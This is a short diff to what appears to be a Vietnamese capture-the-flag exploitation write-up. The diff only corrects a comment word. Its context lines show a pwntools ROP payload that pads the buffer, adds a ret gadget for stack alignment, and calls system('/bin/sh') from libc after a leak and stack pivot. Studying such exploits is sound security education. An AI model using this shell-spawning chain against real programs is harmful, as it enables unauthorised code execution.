@@ -65,7 +65,7 @@ Sau khi đã quay lại hàm main thì leak libc:
 Cuối cùng thì nhập payload chứa ROPchain và địa chỉ chuyển hướng stack pivot
 
     payload=b'A'*8
-    payload+=p64(ret)             // thêm ret thì địa chỉ stack bị lẻ 8 BYTE
+    payload+=p64(ret)             // thêm ret vì địa chỉ stack bị lẻ 8 BYTE
     payload+=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
     payload+=p64(libc.sym['system'])
     payload=payload.ljust(264,b'A')
